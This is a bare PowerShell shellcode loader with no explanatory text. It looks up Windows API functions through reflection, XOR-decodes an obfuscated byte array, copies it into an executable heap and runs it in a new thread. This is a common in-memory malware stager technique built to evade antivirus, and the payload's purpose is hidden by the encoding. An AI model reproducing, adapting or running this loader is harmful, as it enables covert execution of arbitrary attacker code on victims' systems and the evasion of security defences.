function getProcessFunct {

	Param ($moduleName, $functionName)

	$asm = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $asm.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($asm.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $function_,
		[Parameter(Position = 1)] [Type] $delegatetype_ = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $function_).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delegatetype_, $function_).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$hCreate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcessFunct kernel32.dll HeapCreate), (getDelegType @([UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke(0x40000, 0x0, 0x0)

[Byte[]] $scBuf = 0x6c,0xd8,0x13,0x74,0x60,0x78,0x5c,0x90,0x90,0x90,0xd1,0xc1,0xd1,0xc0,0xc2,0xc1,0xd8,0xa1,0x42,0xc6,0xf5,0xd8,0x1b,0xc2,0xf0,0xd8,0x1b,0xc2,0x88,0xd8,0x1b,0xc2,0xb0,0xd8,0x1b,0xe2,0xc0,0xd8,0x9f,0x27,0xda,0xda,0xdd,0xa1,0x59,0xd8,0xa1,0x50,0x3c,0xac,0xf1,0xec,0x92,0xbc,0xb0,0xd1,0x51,0x59,0x9d,0xd1,0x91,0x51,0x72,0x7d,0xc2,0xd8,0x1b,0xc2,0xb0,0x1b,0xd2,0xac,0xd8,0x91,0x40,0xf6,0x11,0xe8,0x88,0x9b,0x92,0xd1,0xc1,0x9f,0x15,0xe2,0x90,0x90,0x90,0x1b,0x10,0x18,0x90,0x90,0x90,0xd8,0x15,0x50,0xe4,0xf7,0xd8,0x91,0x40,0xc0,0xd4,0x1b,0xd0,0xb0,0x1b,0xd8,0x88,0xd9,0x91,0x40,0x73,0xc6,0xd8,0x6f,0x59,0xd1,0x1b,0xa4,0x18,0xdd,0xa1,0x59,0xd8,0x91,0x46,0xd8,0xa1,0x50,0x3c,0xd1,0x51,0x59,0x9d,0xd1,0x91,0x51,0xa8,0x70,0xe5,0x61,0xdc,0x93,0xdc,0xb4,0x98,0xd5,0xa9,0x41,0xe5,0x48,0xc8,0xd4,0x1b,0xd0,0xb4,0xd9,0x91,0x40,0xf6,0xd1,0x1b,0x9c,0xd8,0xd4,0x1b,0xd0,0x8c,0xd9,0x91,0x40,0xd1,0x1b,0x94,0x18,0xd8,0x91,0x40,0xd1,0xc8,0xd1,0xc8,0xce,0xc9,0xca,0xd1,0xc8,0xd1,0xc9,0xd1,0xca,0xd8,0x13,0x7c,0xb0,0xd1,0xc2,0x6f,0x70,0xc8,0xd1,0xc9,0xca,0xd8,0x1b,0x82,0x79,0xdb,0x6f,0x6f,0x6f,0xcd,0xd9,0x2e,0xe7,0xe3,0xa2,0xcf,0xa3,0xa2,0x90,0x90,0xd1,0xc6,0xd9,0x19,0x76,0xd8,0x11,0x7c,0x30,0x91,0x90,0x90,0xd9,0x19,0x75,0xd9,0x2c,0x92,0x90,0x91,0x2b,0x9a,0x9a,0x80,0x9e,0xd1,0xc4,0xd9,0x19,0x74,0xdc,0x19,0x61,0xd1,0x2a,0xdc,0xe7,0xb6,0x97,0x6f,0x45,0xdc,0x19,0x7a,0xf8,0x91,0x91,0x90,0x90,0xc9,0xd1,0x2a,0xb9,0x10,0xfb,0x90,0x6f,0x45,0xfa,0x9a,0xd1,0xce,0xc0,0xc0,0xdd,0xa1,0x59,0xdd,0xa1,0x50,0xd8,0x6f,0x50,0xd8,0x19,0x52,0xd8,0x6f,0x50,0xd8,0x19,0x51,0xd1,0x2a,0x7a,0x9f,0x4f,0x70,0x6f,0x45,0xd8,0x19,0x57,0xfa,0x80,0xd1,0xc8,0xdc,0x19,0x72,0xd8,0x19,0x69,0xd1,0x2a,0x09,0x35,0xe4,0xf1,0x6f,0x45,0x15,0x50,0xe4,0x9a,0xd9,0x6f,0x5e,0xe5,0x75,0x78,0x03,0x90,0x90,0x90,0xd8,0x13,0x7c,0x80,0xd8,0x19,0x72,0xdd,0xa1,0x59,0xfa,0x94,0xd1,0xc8,0xd8,0x19,0x69,0xd1,0x2a,0x92,0x49,0x58,0xcf,0x6f,0x45,0x13,0x68,0x90,0xee,0xc5,0xd8,0x13,0x54,0xb0,0xce,0x19,0x66,0xfa,0xd0,0xd1,0xc9,0xf8,0x90,0x80,0x90,0x90,0xd1,0xc8,0xd8,0x19,0x62,0xd8,0xa1,0x59,0xd1,0x2a,0xc8,0x34,0xc3,0x75,0x6f,0x45,0xd8,0x19,0x53,0xd9,0x19,0x57,0xdd,0xa1,0x59,0xd9,0x19,0x60,0xd8,0x19,0x4a,0xd8,0x19,0x69,0xd1,0x2a,0x92,0x49,0x58,0xcf,0x6f,0x45,0x13,0x68,0x90,0xed,0xb8,0xc8,0xd1,0xc7,0xc9,0xf8,0x90,0xd0,0x90,0x90,0xd1,0xc8,0xfa,0x90,0xca,0xd1,0x2a,0x9b,0xbf,0x9f,0xa0,0x6f,0x45,0xc7,0xc9,0xd1,0x2a,0xe5,0xfe,0xdd,0xf1,0x6f,0x45,0xd9,0x6f,0x5e,0x79,0xac,0x6f,0x6f,0x6f,0xd8,0x91,0x53,0xd8,0xb9,0x56,0xd8,0x15,0x66,0xe5,0x24,0xd1,0x6f,0x77,0xc8,0xfa,0x90,0xc9,0x2b,0x70,0x8d,0xba,0x9a,0xd1,0x19,0x4a,0x6f,0x45

for ($i = 0; $i -lt $scBuf.Count; $i++) {
		$scBuf[$i] = $scBuf[$i] -bxor 90
	}

$hAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcessFunct kernel32.dll HeapAlloc), (getDelegType @([IntPtr], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hCreate, 0x8, $scBuf.Length)

[System.Runtime.InteropServices.Marshal]::Copy($scBuf, 0, $hAlloc, $scBuf.Length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcessFunct kernel32.dll CreateThread), (getDelegType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$hAlloc,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getProcessFunct kernel32.dll WaitForSingleObject), (getDelegType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)